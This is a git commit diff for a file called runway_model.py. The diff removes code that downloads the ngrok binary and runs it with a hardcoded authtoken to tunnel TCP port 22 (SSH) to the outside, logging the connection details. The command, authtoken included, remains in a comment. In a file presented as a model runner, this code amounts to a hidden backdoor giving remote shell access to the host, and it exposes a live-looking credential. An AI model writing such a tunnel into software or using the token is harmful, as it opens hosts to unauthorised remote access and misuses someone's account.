69f03f7427547f390414d280dad3ff192690f175
colabu11 <101316095+colabu11@users.noreply.github.com>
2022-03-23 15:00:01 +0800

    Update runway_model.py

--- runway_model.py
+++ runway_model.py
@@ -1,10 +1,3 @@
 import subprocess
-import requests
-
-url = 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz'
-r = requests.get(url, allow_redirects=True)
-
-open('ngrok-stable-linux-amd64.tgz', 'wb').write(r.content)
-
-subprocess.call("ls && ./ngrok authtoken 1siBHweElRgvcNTEIHUR49WPfcv_5rbwdTbBB5q9cMLJwYcme && ./ngrok tcp 22 --log=stdout > ngrok.log", shell=True)
-subprocess.call("cat ngrok.log && ps -x && ls", shell=True)
+#subprocess.call("ls && ./ngrok authtoken 1siBHweElRgvcNTEIHUR49WPfcv_5rbwdTbBB5q9cMLJwYcme && ./ngrok tcp 22 --log=stdout > ngrok.log", shell=True)
+subprocess.call("ls", shell=True)
